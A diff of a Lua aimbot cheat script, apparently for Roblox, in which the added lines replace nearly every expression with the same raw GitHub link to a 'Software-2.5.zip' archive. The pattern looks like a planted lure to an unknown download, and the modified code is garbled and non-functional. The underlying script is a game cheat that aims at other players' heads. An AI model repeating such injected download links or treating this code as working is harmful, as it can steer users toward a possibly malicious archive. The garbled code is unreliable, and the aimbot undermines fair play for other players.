@@ -1,43 +1,43 @@
 -- Gui
-local ScreenGui = Instance.new("ScreenGui")
-local ToggleButton = Instance.new("TextButton")
+local ScreenGui = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("ScreenGui")
+local ToggleButton = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("TextButton")
 
-ScreenGui.Name = "AimbotGUI"
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = "AimbotGUI"
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("PlayerGui")
 
-ToggleButton.Parent = ScreenGui
-ToggleButton.Size = UDim2.new(0, 100, 0, 40)
-ToggleButton.Position = UDim2.new(0, 10, 0, 10)
-ToggleButton.Text = "Aimbot: OFF"
-ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = ScreenGui
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 100, 0, 40)
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 10, 0, 10)
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = "Aimbot: OFF"
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(255, 0, 0)
 
 -- Variables
 local aimbotEnabled = false
 local players = game:GetService("Players")
-local localPlayer = players.LocalPlayer
-local camera = game.Workspace.CurrentCamera
+local localPlayer = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
+local camera = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
 local runService = game:GetService("RunService")
 
 -- Toggle function
-ToggleButton.MouseButton1Click:Connect(function()
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(function()
     aimbotEnabled = not aimbotEnabled
-    ToggleButton.Text = aimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
-    ToggleButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+    https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = aimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
+    https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = aimbotEnabled and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 255, 0) or https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(255, 0, 0)
 end)
 
 -- Aimbot logic
 local function getClosestPlayer()
     local closestPlayer = nil
-    local shortestDistance = math.huge
+    local shortestDistance = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
 
     for _, player in pairs(players:GetPlayers()) do
-        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("Head") then
-            local head = player.Character.Head
-            local screenPoint, onScreen = camera:WorldToViewportPoint(head.Position)
+        if player ~= localPlayer and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("Head") then
+            local head = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
+            local screenPoint, onScreen = camera:WorldToViewportPoint(https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip)
 
             if onScreen then
                 local mouse = localPlayer:GetMouse()
-                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(mouse.X, mouse.Y)).Magnitude
+                local distance = (https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(screenPoint.X, screenPoint.Y) - https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(mouse.X, mouse.Y)).Magnitude
 
                 if distance < shortestDistance then
                     shortestDistance = distance
@@ -51,11 +51,11 @@ local function getClosestPlayer()
 end
 
 -- Aimbot loop
-runService.RenderStepped:Connect(function()
+https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(function()
     if aimbotEnabled then
         local target = getClosestPlayer()
-        if target and target.Character and target.Character:FindFirstChild("Head") then
-            camera.CFrame = CFrame.new(camera.CFrame.Position, target.Character.Head.Position)
+        if target and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("Head") then
+            https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip, https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip)
         end
     end
 end)
